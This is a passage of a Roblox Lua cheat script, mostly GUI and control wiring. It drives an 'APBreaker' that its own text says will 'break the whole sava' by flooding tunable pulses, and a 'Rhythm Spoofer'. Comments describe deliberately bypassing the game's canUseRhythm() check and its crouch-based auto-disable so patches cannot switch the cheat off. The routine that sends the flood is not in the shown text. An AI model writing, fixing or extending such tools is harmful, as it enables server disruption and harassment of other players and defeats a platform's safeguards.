RhythmBtn.Font = Enum.Font.GothamBold
RhythmBtn.TextSize = 10
RhythmBtn.AutoButtonColor = false
RhythmBtn.ZIndex = 3
RhythmBtn.Parent = MainContent

local RhythmBtnCorner = Instance.new("UICorner")
RhythmBtnCorner.CornerRadius = UDim.new(0, 6)
RhythmBtnCorner.Parent = RhythmBtn

local RhythmBtnStroke = Instance.new("UIStroke")
RhythmBtnStroke.Thickness = 1
RhythmBtnStroke.Color = Color3.fromRGB(255, 255, 255)
RhythmBtnStroke.Transparency = 0.6
RhythmBtnStroke.Parent = RhythmBtn

--// PANEL TOGGLES
local DetailsBtn = Instance.new("TextButton")
DetailsBtn.Size = UDim2.new(0, 24, 0, 24)
DetailsBtn.Position = UDim2.new(0, 160, 0, 12)
DetailsBtn.BackgroundTransparency = 1
DetailsBtn.Text = "ⓘ"
DetailsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
DetailsBtn.Font = Enum.Font.GothamBold
DetailsBtn.TextSize = 15
DetailsBtn.ZIndex = 3
DetailsBtn.Parent = MainContent

local MinimizeBtn = Instance.new("TextButton")
MinimizeBtn.Size = UDim2.new(0, 24, 0, 24)
MinimizeBtn.Position = UDim2.new(0, 185, 0, 12)
MinimizeBtn.BackgroundTransparency = 1
MinimizeBtn.Text = "−"
MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeBtn.Font = Enum.Font.GothamBold
MinimizeBtn.TextSize = 15
MinimizeBtn.ZIndex = 3
MinimizeBtn.Parent = MainContent

local HiBtn = Instance.new("TextButton")
HiBtn.Size = UDim2.new(1, 0, 1, 0)
HiBtn.BackgroundTransparency = 1
HiBtn.Text = "😈"
HiBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
HiBtn.Font = Enum.Font.GothamBold
HiBtn.TextSize = 13
HiBtn.Visible = false
HiBtn.ZIndex = 6
HiBtn.Parent = Frame

local PopoutPanel = Instance.new("Frame")
PopoutPanel.Size = UDim2.new(0, 145, 1, -16)
PopoutPanel.Position = UDim2.new(0, 225, 0, 8)
PopoutPanel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PopoutPanel.BackgroundTransparency = 0.15
PopoutPanel.BorderSizePixel = 0
PopoutPanel.ClipsDescendants = true
PopoutPanel.ZIndex = 3
PopoutPanel.Parent = Frame

local PopoutCorner = Instance.new("UICorner")
PopoutCorner.CornerRadius = UDim.new(0, 8)
PopoutCorner.Parent = PopoutPanel

local PopoutStroke = Instance.new("UIStroke")
PopoutStroke.Thickness = 1
PopoutStroke.Color = Color3.fromRGB(255, 255, 255)
PopoutStroke.Transparency = 0.4
PopoutStroke.Parent = PopoutPanel

local PopoutText = Instance.new("TextLabel")
PopoutText.Size = UDim2.new(1, -16, 1, -16)
PopoutText.Position = UDim2.new(0, 8, 0, 8)
PopoutText.BackgroundTransparency = 1
PopoutText.Text = "wanna boom tha opps? ap break the whole sava boi."
PopoutText.TextColor3 = Color3.fromRGB(45, 35, 65)
PopoutText.Font = Enum.Font.GothamMedium
PopoutText.TextSize = 11
PopoutText.TextWrapped = true
PopoutText.TextXAlignment = Enum.TextXAlignment.Left
PopoutText.TextYAlignment = Enum.TextYAlignment.Top
PopoutText.TextTransparency = 1
PopoutText.ZIndex = 4
PopoutText.Parent = PopoutPanel

local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local popoutOpen = false
local minimized = false

DetailsBtn.MouseButton1Click:Connect(function()
    if minimized then return end
    ClickSound:Play()
    popoutOpen = not popoutOpen
    
    if popoutOpen then
        TweenService:Create(Frame, tweenInfo, {Size = UDim2.new(0, 380, 0, 395)}):Play()
        TweenService:Create(PopoutText, tweenInfo, {TextTransparency = 0}):Play()
        TweenService:Create(DetailsBtn, tweenInfo, {TextTransparency = 0.4}):Play()
    else
        TweenService:Create(Frame, tweenInfo, {Size = UDim2.new(0, 220, 0, 395)}):Play()
        TweenService:Create(PopoutText, tweenInfo, {TextTransparency = 1}):Play()
        TweenService:Create(DetailsBtn, tweenInfo, {TextTransparency = 0}):Play()
    end
end)

local function toggleMinimize(state)
    ClickSound:Play()
    minimized = state
    
    if minimized then
        popoutOpen = false
        TweenService:Create(PopoutText, tweenInfo, {TextTransparency = 1}):Play()
        TweenService:Create(DetailsBtn, tweenInfo, {TextTransparency = 0}):Play()
        
        MainContent.Visible = false
        SwordImage.Visible = false
        HiBtn.Visible = true
        
        TweenService:Create(Frame, tweenInfo, {Size = UDim2.new(0, 45, 0, 30)}):Play()
    else
        HiBtn.Visible = false
        MainContent.Visible = true
        SwordImage.Visible = true
        
        TweenService:Create(Frame, tweenInfo, {Size = UDim2.new(0, 220, 0, 395)}):Play()
    end
end

MinimizeBtn.MouseButton1Click:Connect(function() toggleMinimize(true) end)
HiBtn.MouseButton1Click:Connect(function() toggleMinimize(false) end)

local function applyHoverEffects(btn)
    btn.MouseEnter:Connect(function() TweenService:Create(btn, tweenInfo, {TextTransparency = 0.3}):Play() end)
    btn.MouseLeave:Connect(function() TweenService:Create(btn, tweenInfo, {TextTransparency = 0}):Play() end)
end
applyHoverEffects(DetailsBtn) applyHoverEffects(MinimizeBtn)

--// INTERACTION CONTROLS FOR BOOM BUTTON
local function pressActionButton()
    if APBreaker.enabled then
        APBreaker:stop()
        ActionBtn.Text = "BOOM"
        PulseKnobStroke.Color = Color3.fromRGB(140, 93, 242)
        SpeedKnobStroke.Color = Color3.fromRGB(140, 93, 242)
        WeightKnobStroke.Color = Color3.fromRGB(140, 93, 242)
        TweenService:Create(ActionBtn, tweenInfo, {TextColor3 = Color3.fromRGB(140, 93, 242), BackgroundTransparency = 0.25}):Play()
    else
        APBreaker:start()
        ActionBtn.Text = "STOP"
        PulseKnobStroke.Color = Color3.fromRGB(235, 110, 210)
        SpeedKnobStroke.Color = Color3.fromRGB(235, 110, 210)
        WeightKnobStroke.Color = Color3.fromRGB(235, 110, 210)
        TweenService:Create(ActionBtn, tweenInfo, {TextColor3 = Color3.fromRGB(235, 110, 210), BackgroundTransparency = 0.1}):Play()
    end
end

ActionBtn.MouseButton1Click:Connect(function()
    ClickSound:Play()
    pressActionButton()
end)

ActionBtn.MouseEnter:Connect(function() TweenService:Create(ActionBtnStroke, tweenInfo, {Transparency = 0.1}):Play() end)
ActionBtn.MouseLeave:Connect(function() TweenService:Create(ActionBtnStroke, tweenInfo, {Transparency = 0.4}):Play() end)

--// SLIDERS DRAG INTERACTION LOGIC
local activeSlider = nil

local function updateSliders(input)
    if not activeSlider then return end
    
    local bar = (activeSlider == "Pulse" and PulseBar) or (activeSlider == "Speed" and SpeedBar) or (activeSlider == "Weight" and WeightBar)
    if not bar then return end
    
    local barAbsoluteSize = bar.AbsoluteSize.X
    local barAbsolutePos = bar.AbsolutePosition.X
    local mouseX = input.Position.X
    local percentage = math.clamp((mouseX - barAbsolutePos) / barAbsoluteSize, 0, 1)
    
    if activeSlider == "Pulse" then
        local rawValue = MIN_PULSES + (percentage * (MAX_PULSES - MIN_PULSES))
        PULSES_PER_SECOND = math.round(rawValue)
        PulseTitle.Text = string.format("Pulses/Sec: %s", tostring(PULSES_PER_SECOND):reverse():gsub("(%d%d%d)","%1,"):reverse():gsub("^,",""))
        PulseFill.Size = UDim2.new(percentage, 0, 1, 0)
        PulseKnob.Position = UDim2.new(percentage, -6, 0.5, -6)
    elseif activeSlider == "Speed" then
        local rawValue = MIN_SPEED + (percentage * (MAX_SPEED - MIN_SPEED))
        SPEED = math.round(rawValue)
        SpeedTitle.Text = string.format("Speed: %d", SPEED)
        SpeedFill.Size = UDim2.new(percentage, 0, 1, 0)
        SpeedKnob.Position = UDim2.new(percentage, -6, 0.5, -6)
    elseif activeSlider == "Weight" then
        if APBreaker.rapidWeightEnabled then return end 
        local rawValue = MIN_WEIGHT + (percentage * (MAX_WEIGHT - MIN_WEIGHT))
        WEIGHT = rawValue
        WeightTitle.Text = string.format("Weight: %.2f", WEIGHT)
        WeightFill.Size = UDim2.new(percentage, 0, 1, 0)
        WeightKnob.Position = UDim2.new(percentage, -6, 0.5, -6)
    end
end

PulseBar.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then activeSlider = "Pulse" updateSliders(input) end end)
SpeedBar.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then activeSlider = "Speed" updateSliders(input) end end)
WeightBar.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then activeSlider = "Weight" updateSliders(input) end end)
UIS.InputChanged:Connect(function(input) if activeSlider and input.UserInputType == Enum.UserInputType.MouseMovement then updateSliders(input) end end)
UIS.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then activeSlider = nil end end)

--// RANDOMIZER LOGIC
RandBtn.MouseButton1Click:Connect(function()
    ClickSound:Play()
    APBreaker.randomizerEnabled = not APBreaker.randomizerEnabled
    if APBreaker.randomizerEnabled then
        RandBtn.Text = "RANDOMIZER: ON"
        TweenService:Create(RandBtn, tweenInfo, {BackgroundColor3 = Color3.fromRGB(235, 110, 210), BackgroundTransparency = 0.2}):Play()
    else
        RandBtn.Text = "RANDOMIZER: OFF"
        TweenService:Create(RandBtn, tweenInfo, {BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 0.4}):Play()
    end
end)
RandBtn.MouseEnter:Connect(function() TweenService:Create(RandBtnStroke, tweenInfo, {Transparency = 0.2}):Play() end)
RandBtn.MouseLeave:Connect(function() TweenService:Create(RandBtnStroke, tweenInfo, {Transparency = 0.6}):Play() end)

--// AUTO-CYCLE LOGIC
AutoBtn.MouseButton1Click:Connect(function()
    ClickSound:Play()
    APBreaker.autoCycleEnabled = not APBreaker.autoCycleEnabled
    if APBreaker.autoCycleEnabled then
        AutoBtn.Text = "AUTO-CYCLE (0.5s): ON"
        TweenService:Create(AutoBtn, tweenInfo, {BackgroundColor3 = Color3.fromRGB(235, 110, 210), BackgroundTransparency = 0.2}):Play()
        task.spawn(function()
            while APBreaker.autoCycleEnabled do pressActionButton() task.wait(0.5) end
            if APBreaker.enabled then pressActionButton() end
        end)
    else
        AutoBtn.Text = "AUTO-CYCLE (0.5s): OFF"
        TweenService:Create(AutoBtn, tweenInfo, {BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 0.4}):Play()
    end
end)
AutoBtn.MouseEnter:Connect(function() TweenService:Create(AutoBtnStroke, tweenInfo, {Transparency = 0.2}):Play() end)
AutoBtn.MouseLeave:Connect(function() TweenService:Create(AutoBtnStroke, tweenInfo, {Transparency = 0.6}):Play() end)

--// RAPID WEIGHT LOGIC
RapidWeightBtn.MouseButton1Click:Connect(function()
    ClickSound:Play()
    APBreaker.rapidWeightEnabled = not APBreaker.rapidWeightEnabled
    if APBreaker.rapidWeightEnabled then
        RapidWeightBtn.Text = "RAPID WEIGHT: ON"
        TweenService:Create(RapidWeightBtn, tweenInfo, {BackgroundColor3 = Color3.fromRGB(235, 110, 210), BackgroundTransparency = 0.2}):Play()
    else
        RapidWeightBtn.Text = "RAPID WEIGHT: OFF"
        TweenService:Create(RapidWeightBtn, tweenInfo, {BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 0.4}):Play()
    end
end)
RapidWeightBtn.MouseEnter:Connect(function() TweenService:Create(RapidWeightBtnStroke, tweenInfo, {Transparency = 0.2}):Play() end)
RapidWeightBtn.MouseLeave:Connect(function() TweenService:Create(RapidWeightBtnStroke, tweenInfo, {Transparency = 0.6}):Play() end)

task.spawn(function()
    while true do
        if APBreaker.rapidWeightEnabled then
            local randomPct = math.random(0, 1000) / 1000
            WEIGHT = MIN_WEIGHT + (randomPct * (MAX_WEIGHT - MIN_WEIGHT))
            WeightTitle.Text = string.format("Weight: %.2f", WEIGHT)
            WeightFill.Size = UDim2.new(randomPct, 0, 1, 0)
            WeightKnob.Position = UDim2.new(randomPct, -6, 0.5, -6)
        end
        task.wait(0.05)
    end
end)

--==============================================================================
-- PART 4: INTEGRATED RHYTHM SPOOFER INTERACTIONS (FIXED)
--==============================================================================
local function updateRhythmUIButtonState()
    if activeStates.RhythmSpoofer then
        RhythmBtn.Text = "RHYTHM SPOOFER [G]: ON"
        TweenService:Create(RhythmBtn, tweenInfo, {BackgroundColor3 = Color3.fromRGB(235, 110, 210), BackgroundTransparency = 0.2}):Play()
    else
        RhythmBtn.Text = "RHYTHM SPOOFER [G]: OFF"
        TweenService:Create(RhythmBtn, tweenInfo, {BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 0.4}):Play()
    end
end

local function toggleRhythmSpooferAction()
    if activeStates.RhythmSpoofer then
        activeStates.RhythmSpoofer = false
        updateRhythmUIButtonState()
        stopRhythm()
    else
        -- FIXED: Bypassed the canUseRhythm() restriction. 
        -- If the game updated, this function was likely forcing a 'false' return.
        activeStates.RhythmSpoofer = true
        updateRhythmUIButtonState()
        startRhythm()
    end
end

RhythmBtn.MouseButton1Click:Connect(function()
    ClickSound:Play()
    toggleRhythmSpooferAction()
end)

RhythmBtn.MouseEnter:Connect(function() TweenService:Create(RhythmBtnStroke, tweenInfo, {Transparency = 0.2}):Play() end)
RhythmBtn.MouseLeave:Connect(function() TweenService:Create(RhythmBtnStroke, tweenInfo, {Transparency = 0.6}):Play() end)

-- Global Keybind listener for F2 Visibility Toggle and G Spoofer Toggle
UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end 
    
    if input.KeyCode == Enum.KeyCode.F2 then
        ScreenGui.Enabled = not ScreenGui.Enabled
    elseif input.KeyCode == Enum.KeyCode.G then
        toggleRhythmSpooferAction()
    end
end)

-- Background loop checking tracking requirements
-- FIXED: Added a check so it won't force stopRhythm if the spoofer is active.
RunService.Heartbeat:Connect(function()
    if rhythmActive and not activeStates.RhythmSpoofer then
        if not isCrouching() then
            stopRhythm()
        end
    end
end)

-- FIXED: Removed or bypassed the auto-disable condition that forced 
-- activeStates.RhythmSpoofer to false when the game thinks you aren't crouching.
RunService.PostSimulation:Connect(function()
    -- The update likely forced 'isCrouching()' to return false, triggering this block.
    -- We keep this event listener empty or remove the force-disable logic to prevent patches from turning it off.
end)

LocalPlayer.CharacterAdded:Connect(function()
    currentAnimTrack = nil
    currentSound = nil
    stopAmbientOverride(true)
    if rhythmActive then stopRhythm() end
end)
